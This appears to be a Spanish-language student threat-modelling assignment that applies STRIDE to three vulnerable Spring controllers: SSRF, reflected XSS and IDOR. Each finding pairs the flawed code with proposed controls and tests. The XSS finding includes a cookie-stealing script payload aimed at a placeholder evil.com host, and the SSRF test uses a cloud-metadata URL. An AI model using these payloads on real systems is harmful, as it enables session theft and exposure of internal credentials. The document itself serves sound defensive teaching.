# Avance U1
## Amenazas STRIDE
### Hallazgo 1
en PreviewController:
```
    public String preview(@RequestParam String url) throws Exception { 
        URI uri = URI.create(url);
        HttpRequest r = HttpRequest.newBuilder(uri).timeout(Duration.ofSeconds(3)).GET().build();
        return client.send(r, HttpResponse.BodyHandlers.ofString()).body();
    }
```
- Actor: Un usuario externo (no autenticado o autenticado pero sin permisos de acceso)
- Activo: Datos internos del servidor e información de la infraestructura.
- Vulnerabilidad: El endpoint recibe una URL controlada por el cliente y hace una petición HTTP sin validar la IP.
- Acción no permitida: Forzar al servidor a hacer peticiones HTTP hacia recursos internos o sensibles en su nombre.
- Consecuencia: El atacante puede leer credenciales de la infraestructura o acceder a información privada directamente en la respuesta del endpoint.
- Categoría STRIDE: Information Disclosure
- Amenaza redactada: Un atacante puede enviar como parámetro `url` una dirección interna o de metadata del proveedor de nube, 
y el servidor la solicitará y devolverá el contenido exponiendo información privada que no debería ser accesible desde fuera de
la red interna, aprovechando que `preview()` no valida el url que está recibiendo desde el payload.
- Control propuesto: Validar la URL con una whitelist de esquemas y de dominios permitidos y también resolver el DNS antes de conectar y rechazar la petición si la IP puede ocasionar problemas.
- Prueba que validaría el control: Un usuario solicita `preview` con `url=http://169.254.169.254/latest/meta-data/` (o `http://localhost/admin`); el sistema debe rechazar la petición con una excepción/error antes de intentar conectarse, sin llegar a hacer la llamada HTTP saliente.

## Hallazgo 2

en CommentController:
```
    public String preview(@RequestParam String text) {
        return "<article><h2>Vista previa</h2><p>" + text + "</p></article>";
    }
}
```
- Actor: Un usuario externo o atacante.
- Activo: La sesión y los datos del navegador de un usuario (cookies, tokens, acciones realizadas en su nombre dentro del sistema)
- Vulnerabilidad: El parámetro `text` se concatena directamente dentro del HTML de respuesta (`produces = TEXT_HTML_VALUE`) sin validarlo, permitiendo inyectar código HTML/JavaScript arbitrario.
- Acción no permitida: Ejecutar scripts en el navegador de cualquier usuario que cargue la vista previa con el payload.
- Consecuencia: Cualquier usuario puede robar cookies de sesión, realizar acciones en nombre de otro usuario, redirigirla a sitios maliciosos, o modificar el contenido visible de la página.
- Categoría STRIDE: Tampering
- Amenaza redactada: Cualquier usuario puede enviar como parámetro `text` un valor como `<script>document.location='https://evil.com/steal?c='+document.cookie</script>`, y el servidor lo insertará tal cual dentro del HTML de respuesta sin una validación, 
haciendo que el script se ejecute en el navegador de cualquier usuario que abra esa URL, aprovechando que `preview()` concatena `text` directamente en el `<p>` sin revisar o limpiar el texto recibido.
- Control propuesto: Escapar el contenido de `text` antes de insertarlo en el HTML (encoding de salida, ej. `HtmlUtils.htmlEscape(text)`) y además **quitar `'unsafe-inline'` de la CSP ya configurada** en `SecurityConfig` (`default-src 'self' 'unsafe-inline'`), ya que actualmente esa directiva permite que cualquier script inline se ejecute y anula la defensa en profundidad.
- Prueba que validaría el control: Un usuario solicita `preview` con `text=<script>alert(1)</script>` y la respuesta debe contener el texto escapado (`&lt;script&gt;alert(1)&lt;/script&gt;`) y no debe ejecutarse ningún script en el navegador.

## Hallazgo 3

en TicketController:
```
@GetMapping 
public List<Ticket> all(){ 
    return repo.findAll(); 
}
@GetMapping("/{id}") 
public Ticket one(@PathVariable Long id){ 
    return repo.findById(id).orElseThrow(); 
}
```
- Actor: Un usuario autenticado con cualquier rol sin relación con el ticket consultado.
- Activo: Los tickets de todos los usuarios, incluyendo el campo `privateNote`.
- Vulnerabilidad: Ningún endpoint filtra los resultados por el `owner` del ticket ni por el rol de quien consulta y el método `all()` devuelve  todos los tickets de la base de datos y `one(id)` devuelve cualquier ticket cuyo id se solicite, sin comprobar si pertenece al usuario autenticado.
- Acción no permitida: Leer tickets, incluyendo notas privadas, que pertenecen a otros usuarios sin autorización.
- Consecuencia: Un estudiante autenticado puede ver todos los tickets de otro estudiante, incluidas notas privadas.
- Categoría STRIDE: Elevation of Privilege
- Amenaza redactada: Un usuario autenticado con credenciales válidas puede llamar a `GET /api/tickets` para obtener el listado completo de tickets de todos los usuarios, o iterar `GET /api/tickets/{id}` con ids consecutivos, y en ambos casos recibir tickets incluyendo notas privadas de otros usuarios aprovechando que ninguno de los métodos validan el usuario y el dueño del ticket.
- Control propuesto: En `all()`, filtrar por el `owner` igual al usuario autenticado a menos que su rol sea SUPPORT/ADMIN. En `one(id)` verificar que `ticket.getOwner()` coincida con el usuario autenticado o que su rol tenga permiso explícito.
- Prueba que validaría el control: Un usuario autenticado como `rivera`, solicita `GET /api/tickets/{id}` de un ticket cuyo `owner` es `lopez`, el sistema debe responder 403/404 en vez de devolver el ticket. Autenticado como `rivera`, `GET /api/tickets` solo debe devolver tickets propios (o los que su rol autorice), pero no tickets de otros estudiantes.